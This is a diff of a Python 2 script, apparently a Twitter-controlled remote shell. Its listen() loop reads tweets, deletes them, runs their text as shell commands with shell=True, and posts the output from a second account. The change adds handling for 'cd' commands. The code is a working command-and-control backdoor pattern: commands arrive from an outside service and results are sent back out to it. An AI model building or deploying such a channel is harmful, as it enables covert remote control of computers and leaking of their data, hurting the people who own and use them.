@@ -50,16 +50,21 @@ def listen():
 		if public_tweets:
 			for tweet in public_tweets:
 				test = str(tweet.text)			
-				api.destroy_status(tweet.id)	
-				response = subprocess.check_output(test, shell=True)
+				api.destroy_status(tweet.id)
+				#work on cd command here
+				if test[:2] == "cd":
+					os.chdir(test[3:])
+					print "Directory changed."
+				else:
+					response = subprocess.check_output(test, shell=True)
 				#if response != "" and repsonse != '/Users/Luke/Desktop/':
-				apiTwo.update_status(response)
-				print response
+					apiTwo.update_status(response)
+					print response
 				#else:
 					#api.update_status("Directory changed." ) 
 					#os.chdir(test)	
 				#sleep(5)
-				break
+					break
 				#sleep(3)
 			#if count == 9:
 				#print "Sleeping for 15 minutes..."
